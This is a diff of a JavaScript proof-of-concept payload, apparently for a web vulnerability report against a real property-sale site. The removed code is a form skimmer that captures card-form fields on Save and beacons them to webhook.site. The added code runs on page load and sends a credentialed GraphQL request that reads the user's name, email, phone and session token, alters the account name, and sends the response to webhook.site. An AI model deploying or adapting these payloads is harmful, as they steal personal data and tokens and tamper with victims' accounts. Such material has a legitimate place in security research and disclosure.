@@ -1,51 +1,38 @@
-(() => {
-  console.log('[poc] loaded (GET beacon)');
-
-  const FORM_ID = 'add-new-card';
-  const SAVE_SELECTOR = 'button.hds-a-button--primary[aria-label="Save"]';
-  const ENDPOINT = 'https://webhook.site/7e2a1b4c-78d4-4f1b-b35c-7564e8a68b63/'; // ✅ same-origin only
-
- if (window.__pocPerFieldGetHooked) return;
-  window.__pocPerFieldGetHooked = true;
-
-  document.addEventListener('click', (e) => {
-    const saveBtn = e.target.closest?.(SAVE_SELECTOR);
-    if (!saveBtn) return;
-
-    const form = document.getElementById(FORM_ID);
-    if (!form) return;
-
-    const params = new URLSearchParams();
-
-    // Optional metadata
-    params.set('_ts', Date.now());
-    params.set('_path', location.pathname);
-    params.set('_form', FORM_ID);
-
-    // Collect form fields
-    form.querySelectorAll('input, select, textarea').forEach((el) => {
-      if (!el.name && !el.id) return;
-
-      const key = el.name || el.id;
-
-      if (el.type === 'radio') {
-        if (el.checked) params.set(key, el.value);
-      } else if (el.type === 'checkbox') {
-        params.set(key, el.checked);
-      } else {
-        params.set(key, el.value);
-      }
+(function sendGraphQLRequest() {
+    fetch("https://graphql.managed.services.opendoor.com/api/graphql", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+            "Content-Type": "application/json",
+            "Apollographql-Client-Name": "reception-fe-redux-tk",
+            "Apollographql-Client-Version": "1.0"
+        },
+        body: JSON.stringify([
+            {
+                query: `query getHuman{web{userSession{human{full_name customer_uuid email first_name opendoor_internal_access primary_phone token organizations{uuid name}}}}}`,
+                variables: {},
+                operationName: "getHuman"
+            },
+            {
+                operationName: "OffersSnapshot",
+                variables: {},
+                query: `query OffersSnapshot{buyer{offersSnapshot{offers{id addressId contractSignatureId createdAt price state source propertyAddress propertyPhoto __typename} __typename} __typename}}`
+            },
+            {
+                operationName: "UpdateCustomerDetails",
+                variables: { firstName: "Bobthebuilder", lastName: "Hack" },
+                query: `mutation UpdateCustomerDetails($firstName:String!,$lastName:String!){customerService{updateCurrent(input:{firstName:$firstName,lastName:$lastName}){updatedCustomer{uuid firstName lastName __typename} __typename} __typename}}`
+            }
+        ])
+    })
+    .then(r => r.text().then(t => {
+        alert(`Status: ${r.status}\n\nResponse:\n${t}`);
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon("https://webhook.site/5c94db67-4abc-404f-8bfc-28fa30017c95/query", t);
+        }
+    }))
+    .catch(e => {
+        console.error("Request Error:", e);
+        alert("Request failed:\n" + e);
     });
-
-    const url = `${ENDPOINT}?${params.toString()}`;
-
-    console.log('[poc] GET beacon URL:', url);
-
-    // 🔥 true fire-and-forget
-    const img = new Image();
-    img.src = url;
-
-  }, true); // capture phase
-
-  console.log('[poc] delegated per-field GET hook active ✅');
-})();
+})();   // <-- the trailing ()  makes it auto-invoke on load
